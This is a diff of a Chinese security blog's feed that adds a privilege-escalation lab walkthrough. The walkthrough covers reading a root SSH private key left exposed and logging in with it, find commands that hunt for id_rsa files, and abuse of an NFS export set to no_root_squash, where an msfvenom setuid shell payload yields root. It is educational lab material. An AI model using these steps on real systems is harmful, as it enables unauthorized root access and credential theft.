@@ -1492,7 +1492,109 @@
 </span></span><span style="display:flex;"><span>Password: 
 </span></span><span style="display:flex;"><span>root@RedteamNotes:/home/user# whoami
 </span></span><span style="display:flex;"><span>root
-</span></span></code></pre></div>]]></content></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
+</span></span></code></pre></div><h3 id="ssh-密钥敏感信息提取">SSH 密钥敏感信息提取</h3>
+<p>此内容仅有文字参考，实战内容后续有机会则补齐。</p>
+<p>查看根目录发现有 .ssh 文件夹。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ls -liah /
+</span></span></code></pre></div><p>查看 .ssh 的内容发现有 root_kty。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ ls -liah /.ssh
+</span></span><span style="display:flex;"><span> total 12K 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1175041</span> drwxr-xr-x 
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">2</span> root root 4.0K Aug <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">2019</span> .
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">2</span> drwxr-xr-x <span style="color:#ae81ff">22</span> root root 4.0K Aug <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">2019</span> .. 
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1175042</span> -rw-r--r-- <span style="color:#ae81ff">1</span> root root 1.7K Aug <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">2019</span> root_key
+</span></span></code></pre></div><p>查看 root_key。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /.ssh/root_kty
+</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
+</span></span></code></pre></div><p>在 kali 中使用 id_rsa 进行登入。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Musics/PrivEscaLabs<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>└─$ vim id_rsa 
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Musics/PrivEscaLabs<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>└─$ cat id_rsa
+</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Musics/PrivEscaLabs<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>└─$ sudo chmod <span style="color:#ae81ff">600</span> id_rsa 
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Musics/PrivEscaLabs<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>└─$ ls -liah id_rsa 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">922104</span> -rw------- <span style="color:#ae81ff">1</span> kali kali 1.7K May <span style="color:#ae81ff">15</span> 03:15 id_rsa 
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Musics/PrivEscaLabs<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>└─$ ssh -i id_rsa -oPubkeyAcceptedKeyTypes<span style="color:#f92672">=</span>+ssh-rsa -oHostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>相关的备用搜索命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name authorized_keys 2&gt;/dev/null
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name id_rsa 2&gt;/dev/null
+</span></span></code></pre></div><h3 id="nfs-提权">NFS 提权</h3>
+<p>查看 <code>/etc/export</code> 文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cat /etc/exports 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/exports: the access control list for filesystems which may be exported</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#               to NFS clients.  See exports(5).</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example for NFSv2 and NFSv3:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example for NFSv4:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/tmp *<span style="color:#f92672">(</span>rw,sync,insecure,no_root_squash,no_subtree_check<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#/tmp *(rw,sync,insecure,no_subtree_check)</span>
+</span></span></code></pre></div><p><code>no_root_squash</code> 是 NFS（Network File System）共享设置中的一个选项。它的作用是允许 root 用户在 NFS 客户端机器上拥有和在 NFS 服务器上相同的权限。</p>
+<p>默认情况下，NFS 使用 <code>root_squash</code> 选项，这意味着在 NFS 客户端上，root 用户的所有请求都被映射为一个匿名用户（通常是 <code>nobody</code> 或 <code>nfsnobody</code> ），这样可以防止客户端的 root 用户在 NFS 共享上进行任意操作。</p>
+<p>然而如果设置了 <code>no_root_squash</code> 选项，在 NFS 客户端上的用户就可以像在本地文件系统上一样，拥有对 NFS 共享的完全控制权限。这在某些情况下可能是必要的，但也可能引入安全风险，因为任何可以在客户端获取 root 权限的用户都可以在 NFS 共享上进行任意操作。</p>
+<p><code>/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)</code> 的意思为：所有主机都能访问 <code>/tmp</code> 目录，并且它们可以进行读写（rw），所有的写操作立即生效（sync），允许使用非保留端口链接（insecure），不希望将 root 用户映照为 匿名用户（no_root_squash），并且不希望进行子树检查（no_subtree_check）。</p>
+<p>在 kali 中执行下面操作。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo su                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# mkdir /tmp/nfs
+</span></span><span style="display:flex;"><span>                                                                                                       
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# mount -o rw,vers<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> 10.10.10.12:/tmp /tmp/nfs
+</span></span><span style="display:flex;"><span>Created symlink <span style="color:#e6db74">&#39;/run/systemd/system/remote-fs.target.wants/rpc-statd.service&#39;</span> → <span style="color:#e6db74">&#39;/usr/lib/systemd/system/rpc-statd.service&#39;</span>.
+</span></span><span style="display:flex;"><span>                                                                                                       
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# cd /tmp/nfs  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/tmp/nfs<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# msfvenom -p linux/x86/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/bin/bash -p&#34;</span> -f elf -o /tmp/nfs/shell1.elf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">48</span> bytes
+</span></span><span style="display:flex;"><span>Final size of elf file: <span style="color:#ae81ff">132</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: /tmp/nfs/shell1.elf
+</span></span><span style="display:flex;"><span>                                                                                                       
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/tmp/nfs<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ls -liah shell1.elf                                                        
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1158726</span> -rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">132</span> Jan <span style="color:#ae81ff">16</span> 07:46 shell1.elf
+</span></span><span style="display:flex;"><span>                                                                                                       
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/tmp/nfs<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# chmod +xs shell1.elf
+</span></span></code></pre></div><p>在靶机中执行下面操作。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ ls -liah /tmp/shell1.elf 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1158726</span> -rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">132</span> Jan <span style="color:#ae81ff">16</span> 07:46 /tmp/shell1.elf
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ /tmp/shell1.elf
+</span></span><span style="display:flex;"><span>bash-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>因为我们在 kali 中是 root，所以执行的命令映射到靶机中也是 root，以 root 身份执行了 <code>/bin/bash -p</code> 获得 root 权限。</p>
+<h3 id="内核提权">内核提权</h3>
+<p>可以参考我的文章 <a href="https://enilmalus.github.io/posts/lampiao-writeup/">Lampiao Writeup</a></p>
+]]></content></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ ssh2john id_rsa | tee key_hash
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;SSH 私钥文件本身采用专门的格式储存，其中包含了加密的参数消息、加密算法以及密文数据，而不是直接的密码哈希字符串，私钥加密时会采用密钥派生函数（如 PBKDF2 或 bcrypt ）来对口令生成对称密钥，然后用该密钥对私钥数据进行加密，使得文件内容看起来像是一段难以辨别的编码数据。John 是一个专门用于破解密码哈希的工具，他需要知道加密算法的具体参数（例如加密方式、迭代次数、盐值等），才能通过暴力破解或者字典攻击验证猜测的口令是否正确。ssh2john 就是用来解析 SSH 私钥文件，提取出其中的加密参数和密文数据，构造出一个标准化的哈希格式，这种格式正式 John 能够识别并处理的。只有经过这种转换，John 才能根据已知的加密参数对猜测的口令进行验证，否则直接对原始密钥文件进行暴力破解是不现实的，因为文件格式本身并不直接暴露口令的哈希。&lt;/p&gt;
